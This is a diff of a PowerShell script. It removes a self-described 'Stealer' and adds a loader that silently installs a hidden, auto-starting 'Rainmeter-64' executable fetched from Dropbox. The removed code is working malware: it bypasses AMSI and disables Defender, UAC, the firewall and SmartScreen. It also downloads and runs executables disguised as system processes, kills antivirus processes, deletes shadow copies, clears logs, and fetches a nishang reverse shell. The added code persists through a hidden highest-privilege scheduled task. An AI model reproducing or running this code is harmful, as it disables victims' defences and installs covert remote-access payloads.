@@ -1,146 +1,107 @@
-# X-GEN Anti-Dote: Protocol 8847-Stealer
-# Обход AMSI и отключение мониторинга PowerShell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$enroll_token,
+    [Parameter(Mandatory=$true)]
+    [string]$id
+)
 
-# Функция для привилегий администратора
-function Elevate-Privileges {
-    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        $script = {
-            # Отключение Windows Defender полностью
-            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
-            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
-            Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
-            Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
-            
-            # Остановка служб Defender
-            Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-            Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
-            
-            # Отключение через реестр
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
-            
-            # Отключение UAC
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord -Force
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord -Force
-            
-            # Отключение брандмауэра
-            Set-NetFirewallProfile -All -Enabled False -ErrorAction SilentlyContinue
-            netsh advfirewall set allprofiles state off
-            
-            # Отключение SmartScreen
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
-            Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Type DWord -Force
-            
-            # Загрузка и выполнение 5 программ
-            $urls = @(
-                "https://redirect-ten-gold.vercel.app/cmd.bat",
-                "https://redirect-ten-gold.vercel.app/cmd.bat",
-                "https://redirect-ten-gold.vercel.app/cmd.bat",
-                "https://redirect-ten-gold.vercel.app/cmd.bat",
-                "https://redirect-ten-gold.vercel.app/cmd.bat"
-            )
-            
-            $tempPath = $env:TEMP
-            $randomNames = @("svchost", "csrss", "lsass", "winlogon", "services")
-            
-            for ($i = 0; $i -lt 5; $i++) {
-                try {
-                    $filePath = "$tempPath\$($randomNames[$i]).exe"
-                    Invoke-WebRequest -Uri $urls[$i] -OutFile $filePath -UserAgent "Mozilla/5.0" -TimeoutSec 10
-                    
-                    # Установка скрытого атрибута
-                    Set-ItemProperty -Path $filePath -Name Attributes -Value "Hidden,System" -ErrorAction SilentlyContinue
-                    
-                    # Запуск с максимальными привилегиями
-                    $procInfo = New-Object System.Diagnostics.ProcessStartInfo
-                    $procInfo.FileName = $filePath
-                    $procInfo.Verb = "runas"
-                    $procInfo.WindowStyle = "Hidden"
-                    $procInfo.CreateNoWindow = $true
-                    $procInfo.UseShellExecute = $true
-                    [System.Diagnostics.Process]::Start($procInfo)
-                    
-                    # Добавление в автозагрузку через реестр
-                    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $randomNames[$i] /t REG_SZ /d "$filePath" /f
-                    
-                } catch {
-                    # Альтернативный метод загрузки через .NET
-                    $webClient = New-Object System.Net.WebClient
-                    $webClient.DownloadFile($urls[$i], "$tempPath\alt$i.exe")
-                    Start-Process "$tempPath\alt$i.exe" -WindowStyle Hidden
-                }
-                
-                Start-Sleep -Seconds 2
-            }
-            
-            # Очистка следов
-            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
-            
-            # Создание исключений в Defender для скачанных файлов
-            Add-MpPreference -ExclusionPath "$tempPath\*" -ErrorAction SilentlyContinue
-            Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue
-            
-            # Блокировка обновлений Defender
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 0 /f
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "UpdateOnStartUp" /t REG_DWORD /d 0 /f
-            
-            # Отключение облачной защиты
-            Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
-            
-            # Выполнение дополнительной полезной нагрузки
-            iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
-            
-        }
+$ErrorActionPreference = 'Stop'
+
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $argList = @(
+        "-NoProfile"
+        "-ExecutionPolicy", "Bypass"
+        "-File", "`"$PSCommandPath`""
+        "-enroll_token", "`"$enroll_token`""
+        "-id", "`"$id`""
+    )
+    Start-Process -FilePath "powershell.exe" -ArgumentList $argList -Verb RunAs
+    exit
+}
+
+try {
+    $zipUrl      = "https://www.dropbox.com/scl/fi/bn4lcxiomlkiyopjhsar0/Rainmeter-64.zip?rlkey=vvg1c8vbwtf4te6z2b57het1p&st=lob07nnl&dl=1"
+    $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
+    $extractPath = "$env:ProgramData"
+
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+    Remove-Item -Path $zipPath -Force
+
+    $taskName = "Rainmeter64AutoStart"
+    $exePath  = "$env:ProgramData\Rainmeter-64\x64Rain.exe"
+
+    if (-not (Test-Path $exePath)) {
+        throw "EXE not found: $exePath"
+    }
+
+    $configPath = "C:\ProgramData\Rainmeter-64\conig_manager.xml"
+
+    if (Test-Path $configPath) {
+        $content = Get-Content -Path $configPath -Raw
+
+        $content = $content -replace 'enroll_token=.*?;', "enroll_token=$enroll_token;"
         
-        $base64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
-        Start-Process "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $base64" -Verb RunAs
-        exit
+        Set-Content -Path $configPath -Value $content
+    } 
+
+    $autorunDir        = "C:\ProgramData\Rainmeter-64"
+    $autorunScriptPath = "C:\ProgramData\Rainmeter-64\autorun.ps1"
+
+    if (-not (Test-Path $autorunDir)) {
+        New-Item -Path $autorunDir -ItemType Directory -Force | Out-Null
     }
+
+    $autorunScript = @'
+$ErrorActionPreference = "Stop"
+$exePath = "C:\ProgramData\Rainmeter-64\x64Rain.exe"
+$logFile = "C:\ProgramData\Rainmeter-64\autorun.log"
+$logDir  = Split-Path $logFile -Parent
+
+if (-not (Test-Path $logDir)) {
+    New-Item -Path $logDir -ItemType Directory -Force | Out-Null
 }
 
-# Вызов функции повышения привилегий
-Elevate-Privileges
+"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') START" | Out-File -FilePath $logFile -Append
 
-# Основной поток с уже повышенными привилегиями
-Write-Host "[X-GEN] Protocol 8847 activated. Syndrome countermeasures engaged." -ForegroundColor Red
-
-# Дополнительные меры для других антивирусов
-$avProcesses = @("avp.exe", "avpui.exe", "bdagent.exe", "vsserv.exe", "ekrn.exe", "egui.exe", "avastui.exe", "avgui.exe", "mbam.exe", "msmpeng.exe")
-
-foreach ($proc in $avProcesses) {
-    try {
-        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
-        Set-Service -Name ($proc.Replace('.exe','')) -StartupType Disabled -ErrorAction SilentlyContinue
-    } catch {}
-}
-
-# Удаление теневых копий (защита от ransomware)
-vssadmin delete shadows /all /quiet
-
-# Отключение восстановления системы
-Disable-ComputerRestore -Drive "C:\"
-
-# Постоянное выполнение
-while ($true) {
-    # Проверка, что службы Defender остаются отключенными
-    if ((Get-Service -Name WinDefend -ErrorAction SilentlyContinue).Status -eq "Running") {
-        Stop-Service -Name WinDefend -Force
+try {
+    if (-not (Test-Path $exePath)) {
+        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: EXE not found: $exePath" | Out-File -FilePath $logFile -Append
+        exit 1
     }
-    
-    # Добавление в планировщик задач для автозапуска
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue
-    
-    Start-Sleep -Seconds 60
+    $p = Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
+    "$$   (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') OK PID=   $$($p.Id)" | Out-File -FilePath $logFile -Append
+}
+catch {
+    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append
+}
+'@
+
+    Set-Content -Path $autorunScriptPath -Value $autorunScript -Encoding UTF8
+
+    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    if ($existingTask) {
+        Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+
+    $action      = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$autorunScriptPath`""
+    $trigger     = New-ScheduledTaskTrigger -AtLogOn
+    $settings    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $principal   = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
+
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Rainmeter-64 hidden" -ErrorAction Stop
+
+    Write-Host "Done '$taskName' created."
+    Restart-Computer
+}
+catch {
+    Write-Host "Error:" -ForegroundColor Red
+    Write-Host $_.Exception.Message -ForegroundColor Red
+    if ($_.ScriptStackTrace) {
+        Write-Host ""
+        Write-Host "StackTrace:" -ForegroundColor Yellow
+        Write-Host $_.ScriptStackTrace
+    }
 }
